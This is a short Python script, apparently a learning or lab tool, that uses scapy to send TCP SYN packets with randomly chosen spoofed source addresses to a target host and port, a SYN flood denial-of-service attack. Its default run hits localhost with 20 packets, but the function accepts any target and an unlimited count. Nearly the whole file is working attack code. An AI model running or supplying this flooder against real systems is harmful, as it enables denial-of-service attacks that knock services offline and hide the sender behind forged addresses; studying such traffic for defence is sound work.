from scapy.all import *
import random
import time

def generate_ip():
	res = []
	print("Generating IP list...")
	for i in range(2,5):
		for j in range(2,5):
			for k in range(2,5):
				for l in range(2,254):
					tmpip = str(i) + '.'  + str(j) + '.' + str(k) + '.' + str(l)		
					res.append(tmpip)
	return res



def synFlood(tgt = "127.0.0.1", dport = 8000, num = 0, delay = 0):
	srcList = generate_ip()
	tmp = 0
	for sPort in range(1024, 65535):
		index = random.randrange(len(srcList) - 1)
		print(index, srcList[index])
		ipLayer = IP(src = srcList[index], dst = tgt)
		tcpLayer = TCP(sport = sPort, dport = dport, flags = "S")
		packet = ipLayer / tcpLayer
		send(packet)
		if delay != 0:
			time.sleep(delay)
		if num != 0:
			tmp = tmp + 1
			if(tmp == num):
				break
		
if __name__ == "__main__":
	synFlood("127.0.0.1", 8000, 20)
